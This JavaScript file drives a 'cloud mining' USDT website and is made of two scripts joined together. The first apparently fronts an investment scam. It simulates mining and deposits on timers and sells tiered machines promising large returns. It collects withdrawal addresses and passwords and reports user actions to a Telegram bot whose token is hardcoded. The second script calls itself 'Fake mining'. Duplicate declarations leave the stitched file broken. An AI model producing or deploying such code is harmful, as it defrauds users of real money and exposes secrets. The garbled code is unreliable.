// script.js
const TELEGRAM_TOKEN = '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0';
const CHAT_ID = '7417215529';
const BOT_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

let userId = localStorage.getItem('userId') || 'USER_' + Math.random().toString(36).substr(2, 9);
localStorage.setItem('userId', userId);
document.getElementById('userId').textContent = `User ID: ${userId}`;

let fundBalance = parseFloat(localStorage.getItem('fundBalance')) || 20;
let brokerBalance = parseFloat(localStorage.getItem('brokerBalance')) || 0;
let withdrawBalance = parseFloat(localStorage.getItem('withdrawBalance')) || 0;
let refCode = localStorage.getItem('refCode') || 'REF_' + Math.random().toString(36).substr(2, 5);
localStorage.setItem('refCode', refCode);
document.getElementById('refCode').textContent = refCode;

let miningActive = false;
let miningStartTime = null;
let ownedMachines = JSON.parse(localStorage.getItem('ownedMachines')) || [];
let freeMiningDays = parseInt(localStorage.getItem('freeMiningDays')) || 7;
let dailyFreeClaimed = localStorage.getItem('dailyFreeClaimed') === new Date().toDateString();

updateBalances();

function updateBalances() {
    document.getElementById('fundBalance').textContent = fundBalance.toFixed(2);
    document.getElementById('brokerBalance').textContent = brokerBalance.toFixed(2);
    document.getElementById('withdrawBalance').textContent = withdrawBalance.toFixed(2);
    localStorage.setItem('fundBalance', fundBalance);
    localStorage.setItem('brokerBalance', brokerBalance);
    localStorage.setItem('withdrawBalance', withdrawBalance);
}

// Tab switching
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        e.target.classList.add('active');
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.getElementById(e.target.dataset.tab).classList.add('active');
    });
});

// Mining
let miningInterval;
document.getElementById('startMining').addEventListener('click', startMining);
document.getElementById('claimMining').addEventListener('click', claimMining);

function startMining() {
    if (ownedMachines.length === 0 && freeMiningDays <= 0) {
        alert('Buy a machine or use free mining!');
        return;
    }
    miningActive = true;
    miningStartTime = Date.now();
    document.getElementById('startMining').style.display = 'none';
    document.getElementById('claimMining').style.display = 'none';
    document.getElementById('miningAnimation').classList.add('active'); // Add CSS class for animation
    miningInterval = setInterval(updateTimer, 1000);
    if (ownedMachines.length > 0) {
        // Start cloud mining simulation
        setTimeout(() => {
            let solMined = 0;
            ownedMachines.forEach(m => {
                const daily = [0,2,10,30,90,275,844,2650,8477,29160,72900][m]; // Daily USDT
                solMined += daily * 0.3; // 30% SOL
            });
            brokerBalance += solMined * 0.01; // Simulate claim to USDT equiv
            updateBalances();
        }, 12 * 60 * 60 * 1000); // 12 hours
    }
}

function updateTimer() {
    if (!miningStartTime) return;
    let elapsed = Date.now() - miningStartTime;
    let timeLeft = 12 * 60 * 60 * 1000 - elapsed;
    if (timeLeft <= 0) {
        clearInterval(miningInterval);
        document.getElementById('claimMining').style.display = 'block';
        document.getElementById('miningInfo').textContent = 'Mining Complete! Claim Now.';
        return;
    }
    let hours = Math.floor(timeLeft / (60 * 60 * 1000));
    let mins = Math.floor((timeLeft % (60 * 60 * 1000)) / (60 * 1000));
    let secs = Math.floor((timeLeft % (60 * 1000)) / 1000);
    document.getElementById('miningTimer').textContent = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
}

function claimMining() {
    miningActive = false;
    // Add rewards based on machines
    let reward = 0;
    ownedMachines.forEach(m => reward += [0,2,10,30,90,275,844,2650,8477,29160,72900][m]);
    brokerBalance += reward;
    updateBalances();
    document.getElementById('claimMining').style.display = 'none';
    document.getElementById('startMining').style.display = 'block';
    document.getElementById('miningAnimation').classList.remove('active');
    sendTelegramMsg(`User ${userId} claimed ${reward} USDT from mining.`);
}

// Free Claim
document.getElementById('freeClaim').addEventListener('click', () => {
    if (dailyFreeClaimed || freeMiningDays <= 0) {
        alert('Already claimed today or expired!');
        return;
    }
    brokerBalance += 1;
    updateBalances();
    dailyFreeClaimed = true;
    localStorage.setItem('dailyFreeClaimed', new Date().toDateString());
    // Reset daily tomorrow
    setTimeout(() => { dailyFreeClaimed = false; localStorage.removeItem('dailyFreeClaimed'); }, 24*60*60*1000);
    freeMiningDays--;
    localStorage.setItem('freeMiningDays', freeMiningDays);
    if (freeMiningDays <= 0) document.querySelector('.free-mining').innerHTML = '<p>Free Mining Expired!</p>';
    sendTelegramMsg(`User ${userId} claimed free 1 USDT.`);
});

// Buy Machine
document.querySelectorAll('.buy-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
        const machine = parseInt(e.target.closest('.machine').dataset.machine);
        const cost = [0,10,50,150,450,1350,4050,12150,36450,72900,145800][machine];
        if (fundBalance < cost) {
            document.getElementById('rechargeBtn').click();
            return;
        }
        document.getElementById('buyDetails').textContent = `Buy Mining Machine ${machine} for ${cost} USDT?`;
        document.getElementById('buyModal').classList.add('active');
        document.getElementById('confirmBuy').onclick = () => confirmBuy(machine, cost);
    });
});

function confirmBuy(machine, cost) {
    fundBalance -= cost;
    ownedMachines.push(machine);
    localStorage.setItem('ownedMachines', JSON.stringify(ownedMachines));
    updateBalances();
    document.getElementById('buyModal').classList.remove('active');
    // Start mining if not active
    if (!miningActive) {
        document.getElementById('startMining').style.display = 'block';
        document.getElementById('miningInfo').textContent = 'Click Start to begin mining!';
    }
    sendTelegramMsg(`User ${userId} bought Mining Machine ${machine} for ${cost} USDT.`);
    // Simulate 30% SOL mine start
}

// Recharge Modal
document.getElementById('rechargeBtn').addEventListener('click', () => {
    document.getElementById('rechargeModal').classList.add('active');
});

document.getElementById('closeModal').addEventListener('click', () => {
    document.getElementById('rechargeModal').classList.remove('active');
});

document.getElementById('confirmDeposit').addEventListener('click', () => {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    if (!amount || amount < 10) {
        alert('Min 10 USDT');
        return;
    }
    document.getElementById('paymentOptions').style.display = 'block';
    document.getElementById('confirmDeposit').style.display = 'none';
});

document.querySelectorAll('[data-chain]').forEach(btn => {
    btn.addEventListener('click', (e) => {
        // Show loading 2s
        document.getElementById('loadingScreen').style.display = 'block';
        setTimeout(() => {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('depositSuccess').style.display = 'block';
            // Wait 3 min to add
            setTimeout(() => {
                fundBalance += amount;
                updateBalances();
                sendTelegramMsg(`User ${userId} deposited ${amount} USDT via ${e.target.dataset.chain}.`);
                document.getElementById('rechargeModal').classList.remove('active');
            }, 3 * 60 * 1000);
        }, 2000);
    });
});

document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
        const address = e.target.parentElement.textContent.split('(')[1].split(')')[0];
        navigator.clipboard.writeText(address);
        e.target.textContent = 'Copied!';
        setTimeout(() => { e.target.textContent = 'Copy'; }, 2000);
    });
});

document.querySelectorAll('.pay-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        alert('Payment simulated. Wait for confirmation.');
    });
});

// Team Invite
document.getElementById('submitRef').addEventListener('click', () => {
    const entered = document.getElementById('enterRef').value;
    if (entered) {
        // Simulate reward 1 USDT
        brokerBalance += 1;
        updateBalances();
        sendTelegramMsg(`User ${userId} invited with code ${entered}. Reward 1 USDT.`);
        alert('Invite successful! +1 USDT');
    }
});

// Withdraw
document.getElementById('confirmWithdraw').addEventListener('click', () => {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value;
    const pass = document.getElementById('securityPass').value;
    if (!amount || amount < 50 || !address || !pass) {
        alert('Fill all fields, min 50 USDT');
        return;
    }
    if (brokerBalance < amount) {
        alert('Insufficient balance');
        return;
    }
    brokerBalance -= amount;
    withdrawBalance -= amount; // Assuming withdraw from broker
    updateBalances();
    document.getElementById('withdrawMsg').innerHTML = '<p>Warm reminder: Cash withdrawals can be made at any time. Please wait 24 hours for confirmation.</p>';
    sendTelegramMsg(`User ${userId} requested withdraw ${amount} USDT to ${address}. Wait 24h.`);
    // Simulate add after 24h
    setTimeout(() => {
        // Actual transfer simulation, but client-side can't, just notify
        sendTelegramMsg(`Withdraw confirmed for ${userId}: ${amount} USDT.`);
    }, 24 * 60 * 60 * 1000);
});

// Modals close
document.getElementById('cancelBuy').addEventListener('click', () => {
    document.getElementById('buyModal').classList.remove('active');
});

// Telegram Send
function sendTelegramMsg(text) {
    fetch(`${BOT_URL}?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
        .then(() => console.log('Sent to Telegram'))
        .catch(err => console.error('Telegram error:', err));
}

// Init mining if owned
if (ownedMachines.length > 0) {
    document.getElementById('startMining').style.display = 'block';
}

// Daily free reset check
if (new Date().toDateString() !== localStorage.getItem('lastFreeDate')) {
    dailyFreeClaimed = false;
    localStorage.setItem('dailyFreeClaimed', '');
    localStorage.setItem('lastFreeDate', new Date().toDateString());
}

// Add CSS for active mining animation
const style = document.createElement('style');
style.textContent = `
.mining-animation.active .miner { animation-duration: 1s; }
.mining-animation.active .particles::before { animation-duration: 5s; }
#selectMainnet option:hover { background: gold; color: black; }
`;
document.head.appendChild(style);

// JavaScript for Functionality
let balance = 0;
let miningInterval = null;
let isMining = false;

// Load data from localStorage
function loadData() {
    const savedBalance = localStorage.getItem('usdtBalance');
    if (savedBalance) {
        balance = parseFloat(savedBalance);
        updateBalance();
    }
}

// Save data to localStorage
function saveData() {
    localStorage.setItem('usdtBalance', balance.toFixed(2));
}

function updateBalance() {
    document.getElementById('balance').textContent = balance.toFixed(2) + ' USDT';
    saveData();
}

function deposit() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    if (amount > 0) {
        balance += amount;
        updateBalance();
        document.getElementById('depositMsg').textContent = `Deposited ${amount} USDT!`;
        document.getElementById('depositAmount').value = '';
        setTimeout(() => { document.getElementById('depositMsg').textContent = ''; }, 3000);
    } else {
        document.getElementById('depositMsg').textContent = 'Invalid amount!';
    }
}

function startMining() {
    if (!isMining) {
        isMining = true;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('startBtn').textContent = 'Mining Active...';
        document.getElementById('status').textContent = 'Mining USDT - Advanced Cloud Power!';
        document.getElementById('miningArea').style.animation = 'pulse 1s infinite';

        // Add more clouds for advanced look
        const area = document.getElementById('miningArea');
        for (let i = 0; i < 3; i++) {
            const cloud = document.createElement('div');
            cloud.className = `cloud ${i % 2 === 0 ? 'golden-cloud' : 'purple-cloud'}`;
            cloud.textContent = '☁️';
            cloud.style.left = Math.random() * 100 + '%';
            cloud.style.animationDuration = (4 + Math.random() * 4) + 's';
            area.appendChild(cloud);
        }

        // Fake mining: earn 0.01 USDT every 5 seconds
        miningInterval = setInterval(() => {
            balance += 0.01;
            updateBalance();
        }, 5000);
    }
}

// Fetch live USDT to BTC price using CoinGecko API
async function fetchPrice() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=btc');
        const data = await response.json();
        const price = data.tether.btc;
        document.getElementById('price').textContent = `1 USDT = ${price.toFixed(8)} BTC`;
    } catch (error) {
        document.getElementById('price').textContent = 'Price fetch failed - Check connection';
    }
}

// Update price every 30 seconds
setInterval(fetchPrice, 30000);
fetchPrice(); // Initial fetch

// Load on start
loadData();

// Add pulse animation for mining area (if not in CSS)
const style = document.createElement('style');
style.textContent = `
    @keyframes pulse {
        0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.7); }
        70% { box-shadow: 0 0 0 20px rgba(255, 215, 0, 0); }
        100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0); }
    }
`;
document.head.appendChild(style);
